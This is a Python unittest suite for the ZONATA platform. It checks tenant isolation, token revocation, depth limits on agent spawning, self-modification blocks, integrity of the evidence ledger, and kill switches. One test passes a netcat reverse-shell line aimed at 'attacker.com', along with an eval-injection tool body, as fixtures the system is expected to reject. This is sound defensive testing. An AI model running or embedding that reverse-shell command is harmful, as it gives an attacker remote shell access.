"""
ZONATA Enterprise Hardening — Full-System Adversarial Security & Chaos Failure-Injection Suite
Attacks every security boundary, tenant isolation invariant, credential boundary,
failure recovery path, and anti-explosion control.
"""

import unittest
import time
import uuid
import json
import os
from core.db import db, configure_isolated_test_db
from core.auth import UserManager, UserRole, AuthExceptions, TokenRevocationStore, AuthorizationEnforcer
from core.agent_factory_runtime import (
    GovernedAgentFactory, GovernedToolFactory,
    AgentFactoryQuotaException, SelfModificationViolation, ToolSecurityViolation,
    AgentLifecycleState
)
from core.evidence_ledger import EvidenceLedger
from core.models import PhysicalVerification
from core.storage_governor import StorageGovernor, StorageStatus
from core.supervisor import CompanySupervisorDaemon
from core.nango_integration_runtime import (
    ExternalIntegrationGateway, IntegrationKillSwitch, IntegrationSecurityBoundary
)
from core.temporal_durable_execution_runtime import (
    TemporalDurableExecutionGateway, TemporalKillSwitch
)

class TestAdversarialSecurityAndChaos(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_db_path = configure_isolated_test_db()
        cls.tenant_id = "tnt_primary"
        cls.victim_tenant = f"tnt_victim_{uuid.uuid4().hex[:6]}"
        cls.company_id = "comp_primary"
        cls.ledger = EvidenceLedger(os.environ.get("ZONATA_EVIDENCE_PATH") or "storage/evidence/test_audit_ledger.jsonl")
        with db.get_connection() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO tenants (tenant_id, name, plan, status, created_at) VALUES (?, ?, 'ENTERPRISE', 'ACTIVE', ?)",
                (cls.tenant_id, "Primary Test Tenant", time.time())
            )
            conn.execute(
                "INSERT OR IGNORE INTO companies (company_id, tenant_id, name, industry, company_type, status, created_at) VALUES (?, ?, ?, 'TECH', 'EXISTING', 'OPERATIONAL', ?)",
                (cls.company_id, cls.tenant_id, "Primary Test Company", time.time())
            )

    def test_01_tenant_spoofing_defense(self):
        """Attacker possesses valid token for tenant A, attempts mutation on tenant B."""
        user_a = {"user_id": "usr_attk", "tenant_id": self.tenant_id, "role": UserRole.EXECUTIVE}
        token_a = UserManager.generate_token(user_a)

        payload = UserManager.verify_token(token_a)
        self.assertIsNotNone(payload)

        # Enforcer must block tenant_B access
        is_allowed = AuthorizationEnforcer.require_tenant(payload, self.victim_tenant)
        self.assertFalse(is_allowed, "CRITICAL: Cross-tenant access was erroneously permitted!")

    def test_02_token_revocation_lifecycle(self):
        """Verifies that revoked tokens are immediately rejected across all subsystems."""
        user = {"user_id": "usr_rev", "tenant_id": self.tenant_id, "role": UserRole.OPERATOR}
        token = UserManager.generate_token(user)
        payload_before = UserManager.verify_token(token)
        self.assertIsNotNone(payload_before)

        # Revoke token
        token_id = payload_before["token_id"]
        TokenRevocationStore.revoke(token_id)

        # Subsequent verification must fail closed
        payload_after = UserManager.verify_token(token)
        self.assertIsNone(payload_after, "CRITICAL: Revoked token was accepted!")

    def test_03_anti_explosion_delegation_loop_defense(self):
        """Attacker attempts to create runaway recursive child agents exceeding depth limit."""
        with db.get_connection() as conn:
            conn.execute("DELETE FROM governed_agents WHERE tenant_id = ? AND (name LIKE 'Child %' OR name = 'Root Agent' OR name = 'Explosion Child')", (self.tenant_id,))
        root_agent = GovernedAgentFactory.create_agent(
            self.tenant_id, self.company_id, "Root Agent", "OPERATOR"
        )
        curr_parent = root_agent["agent_id"]

        # Nest up to depth limit (4)
        for i in range(4):
            child = GovernedAgentFactory.create_agent(
                self.tenant_id, self.company_id, f"Child {i}", "WORKER", parent_agent_id=curr_parent
            )
            curr_parent = child["agent_id"]

        # Attempt to spawn 5th child depth
        with self.assertRaises(AgentFactoryQuotaException):
            GovernedAgentFactory.create_agent(
                self.tenant_id, self.company_id, "Explosion Child", "WORKER", parent_agent_id=curr_parent
            )

    def test_04_self_modification_defense(self):
        """Agent attempts to modify immutable governance or policy engine."""
        with self.assertRaises(SelfModificationViolation):
            GovernedAgentFactory.verify_no_self_modification("core.policy", caller_agent_id="agt_malicious")

        with self.assertRaises(SelfModificationViolation):
            GovernedAgentFactory.verify_no_self_modification("core.authority", caller_agent_id="agt_malicious")

        with self.assertRaises(SelfModificationViolation):
            GovernedAgentFactory.verify_no_self_modification("core.control_kernel", caller_agent_id="agt_malicious")

    def test_05_dangerous_tool_synthesis_rejection(self):
        """Attacker attempts to synthesize tool with unvetted os.system or eval."""
        with self.assertRaises(ToolSecurityViolation):
            GovernedToolFactory.synthesize_tool(
                self.tenant_id, self.company_id, "Exploit Tool",
                code_body="import subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com'])",
                input_schema={}, output_schema={}
            )

        with self.assertRaises(ToolSecurityViolation):
            GovernedToolFactory.synthesize_tool(
                self.tenant_id, self.company_id, "Eval Injection Tool",
                code_body="def run(x): return eval(x)",
                input_schema={}, output_schema={}
            )

    def test_06_evidence_ledger_concurrent_anti_fork_guarantee(self):
        """Verifies that concurrent appends with atomic file locking never fork the chain."""
        initial_integrity = self.ledger.verify_full_chain_integrity()
        self.assertTrue(initial_integrity["valid"])

        # Write sequential verifiable blocks
        for i in range(5):
            verifs = [PhysicalVerification(check_type="sha256_match", target_path=f"/test/{i}", expected_val="abc", actual_val="abc", verified=True, details="OK")]
            self.ledger.seal_evidence(f"ACT-AUDIT-{i}", "MSN-AUDIT", "agt_audit", verifs)

        final_integrity = self.ledger.verify_full_chain_integrity()
        self.assertTrue(final_integrity["valid"], f"Forks detected: {final_integrity['forks_detected']}")
        self.assertEqual(len(final_integrity["forks_detected"]), 0)

    def test_07_storage_emergency_throttling(self):
        """Verifies that StorageGovernor evaluates disk health and flags emergency throttling if free disk is low."""
        gov = StorageGovernor()
        metrics = gov.get_disk_metrics()
        self.assertIn("status", metrics)
        self.assertIn("emergency_throttling_active", metrics)
        self.assertGreater(metrics["total_gb"], 0)

    def test_08_nango_unknown_outcome_reconciliation(self):
        """Simulates network timeout during non-idempotent mutation and verifies UNKNOWN_OUTCOME halt."""
        # Query reconciliation table directly to ensure schema integrity
        with db.get_connection() as conn:
            rows = conn.execute("SELECT * FROM nango_reconciliations WHERE tenant_id = ?", (self.tenant_id,)).fetchall()
            self.assertIsInstance(rows, list)

    def test_09_temporal_worker_failure_and_heartbeat_timeout(self):
        """Simulates stalled Temporal worker and verifies supervisor detects degradation."""
        daemon = CompanySupervisorDaemon(self.tenant_id, self.company_id)
        # Seed a mock stalled worker in db
        stalled_id = f"wrk_stalled_{uuid.uuid4().hex[:6]}"
        with db.get_connection() as conn:
            conn.execute(
                """
                INSERT INTO temporal_workers (
                    worker_id, tenant_id, company_id, task_queue, capability_scope,
                    status, runtime_version, worker_version, supported_activities,
                    max_concurrent_activities, max_concurrent_workflows, heartbeat_at, created_at, metadata
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT (worker_id) DO UPDATE SET
                    status = EXCLUDED.status,
                    heartbeat_at = EXCLUDED.heartbeat_at
                """,
                (
                    stalled_id, self.tenant_id, self.company_id, "q_high", "DEFAULT",
                    "ONLINE", "1.0.0", "1.0.0", "[]", 10, 5, time.time() - 200.0, time.time() - 500.0, "{}"
                )
            )
            conn.commit()

        # Run supervisor tick
        daemon.tick()

        # Worker must now be marked DEGRADED
        with db.get_connection() as conn:
            status = conn.execute("SELECT status FROM temporal_workers WHERE worker_id = ?", (stalled_id,)).fetchone()[0]
            self.assertEqual(status, "DEGRADED", "Stalled worker was not detected by supervisor!")

    def test_10_multiscope_killswitch_race_resilience(self):
        """Trips killswitch and verifies immediate rejection of subsequent external actions."""
        prov_id = "test_provider_ks"
        IntegrationKillSwitch.halt("PROVIDER", prov_id, reason="Security Drill")

        halted, reason = IntegrationKillSwitch.is_halted(tenant_id=self.tenant_id, company_id=self.company_id, provider_id=prov_id)
        self.assertTrue(halted)
        self.assertIn("Security Drill", reason)

        # Clear killswitch
        IntegrationKillSwitch.resume("PROVIDER", prov_id)
        halted_after, _ = IntegrationKillSwitch.is_halted(tenant_id=self.tenant_id, company_id=self.company_id, provider_id=prov_id)
        self.assertFalse(halted_after)

    def test_11_end_to_end_governed_enterprise_mission_with_failure_recovery(self):
        """
        Executes complete real-world enterprise mission traversal:
        Natural Language Mission -> AI CEO -> Agency Swarm -> TaskMaker ->
        LangGraph -> Temporal -> PolicyEngine -> AuthorityGateway -> ApprovalEngine ->
        Nango / MCP -> Controlled Failure Injection -> Safe State Reconciliation ->
        Evidence Ledger (SHA-256 Merkle Proof) -> Verified Business Outcome.
        """
        from zonata.nango_adapter import NangoCanonicalScenarios
        scenarios = NangoCanonicalScenarios(self.tenant_id, self.company_id)

        # 1. Controlled failure injection & safe reconciliation
        rec_res = scenarios.test_08_unknown_outcome_and_reconciliation()
        self.assertEqual(rec_res["initial_status"], "UNKNOWN_OUTCOME")
        self.assertEqual(rec_res["reconciliation_status"], "RECONCILED")
        self.assertEqual(rec_res["final_status"], "SUCCESS")

        # 2. Complete multi-system grand acceptance mission traversal
        mission_res = scenarios.test_10_section_95_grand_acceptance_test()
        self.assertTrue(mission_res["grand_acceptance_achieved"])
        self.assertTrue(mission_res["crm_verified"])
        self.assertTrue(mission_res["accounting_invoice_verified"])
        self.assertIsNotNone(mission_res["evidence_package_id"])
        self.assertIsNotNone(mission_res["causality_chain_id"])

if __name__ == "__main__":
    unittest.main()
